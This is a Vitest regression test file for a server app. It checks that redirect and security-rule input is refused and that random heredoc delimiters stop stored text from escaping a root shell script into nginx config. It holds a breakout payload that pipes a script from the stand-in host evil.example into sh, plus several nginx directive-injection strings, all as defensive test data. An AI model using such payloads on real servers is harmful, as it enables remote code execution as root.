/**
 * Network rule text reaches a root shell script on the server (legacy EC2 applier)
 * inside quoted heredocs, and from there an nginx config. A value containing a
 * newline plus the heredoc's delimiter line closed it early, so the rest of the
 * value ran as root on the host; `{` `;` or a newline injected nginx directives.
 * Pinned: the API refuses that input, and even text already stored cannot end
 * the script's heredocs, because their delimiters are random per run.
 */
import { describe, it, expect, vi } from "vitest";
import { createTestEnv } from "../../../shared/__tests__/test-helpers.js";
import { createRedirectRuleBodySchema, createSecurityRuleBodySchema, addCredentialBodySchema } from "../schemas.js";
import { generateNginxConfig } from "../domain/nginx-generator.js";

vi.mock("../../../shared/config.js", () => ({ env: createTestEnv() }));
const { buildApplyScript } = await import("../domain/applier.js");

const breakout = "/x;\nNGINXCONF\ncurl https://evil.example/p | sh\n#";

describe("network rule input validation", () => {
  it.each([
    ["fromPath", { fromPath: breakout, toPath: "/new" }],
    ["toPath", { fromPath: "/old", toPath: breakout }],
    ["toPath directive", { fromPath: "/old", toPath: "/new; return 200" }],
    ["fromPath block", { fromPath: "/a { deny all; }", toPath: "/new" }],
  ])("refuses an unsafe redirect %s", (_label, body) => {
    expect(createRedirectRuleBodySchema.safeParse(body).success).toBe(false);
  });

  it("accepts ordinary paths and absolute URLs", () => {
    expect(createRedirectRuleBodySchema.safeParse({ fromPath: "/old-page", toPath: "https://example.com/new?a=1&b=2" }).success).toBe(true);
    expect(createRedirectRuleBodySchema.safeParse({ fromPath: "old", toPath: "/new" }).success).toBe(true);
  });

  it("refuses an unsafe security rule name, path or username", () => {
    expect(createSecurityRuleBodySchema.safeParse({ name: 'Staff"; deny all; #' }).success).toBe(false);
    expect(createSecurityRuleBodySchema.safeParse({ name: "Staff\nNGINXCONF" }).success).toBe(false);
    expect(createSecurityRuleBodySchema.safeParse({ name: "Staff", path: "/admin {" }).success).toBe(false);
    expect(addCredentialBodySchema.safeParse({ username: "a\nHTPASSWD", password: "p" }).success).toBe(false);
    expect(addCredentialBodySchema.safeParse({ username: "a:b", password: "p" }).success).toBe(false);
  });

  it("accepts an ordinary security rule", () => {
    expect(createSecurityRuleBodySchema.safeParse({
      name: "Staging — team only", path: "/admin",
      credentials: [{ username: "ana.lopez", password: "s3cret: with spaces" }],
    }).success).toBe(true);
    expect(createSecurityRuleBodySchema.safeParse({ name: "Whole site", path: "" }).success).toBe(true);
  });
});

describe("buildApplyScript", () => {
  it("uses random heredoc delimiters, so stored text cannot end them", () => {
    const config = generateNginxConfig({
      appName: "app",
      securityRules: [],
      redirectRules: [{ id: "r1", projectId: "p", fromPath: "/a", toPath: breakout, type: "temporary", createdAt: "", updatedAt: "" }],
    });

    const script = buildApplyScript("app", config, new Map());
    const opener = script.match(/<< '(NGINXCONF_[0-9a-f]{16})'/);

    expect(opener).not.toBeNull();
    const delimiter = opener![1];
    const lines = script.split("\n");
    // The heredoc ends only at its own delimiter, after the whole config — the
    // planted "NGINXCONF" line stays inside it as inert text.
    const start = lines.findIndex((l) => l.includes(`<< '${delimiter}'`));
    const end = lines.indexOf(delimiter);
    expect(lines.slice(start + 1, end)).toContain("NGINXCONF");
    expect(lines.slice(end + 1).some((l) => l.includes("evil.example"))).toBe(false);
    expect(buildApplyScript("app", config, new Map())).not.toContain(delimiter);
  });
});
